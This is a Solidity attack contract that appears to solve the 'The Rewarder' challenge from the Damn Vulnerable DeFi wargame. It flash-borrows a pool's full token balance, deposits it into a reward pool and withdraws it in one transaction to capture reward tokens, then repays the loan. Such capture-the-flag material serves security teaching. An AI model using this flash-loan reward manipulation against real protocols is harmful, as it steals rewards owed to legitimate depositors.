pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";


contract RewarderAttack {

    DamnValuableToken public token;
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewardPool;
    RewardToken public rewardToken;

    constructor(address _token, address _rewardPool, address _loanPool, address _rewardToken) {
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        flashLoanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external {
        uint256 poolTokenBalance = token.balanceOf(address(flashLoanPool));

        flashLoanPool.flashLoan(poolTokenBalance);

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) public {

        token.approve(address(rewardPool), _amount);

        rewardPool.deposit(_amount);

        rewardPool.withdraw(_amount);

        token.transfer(address(flashLoanPool), _amount);
    }
}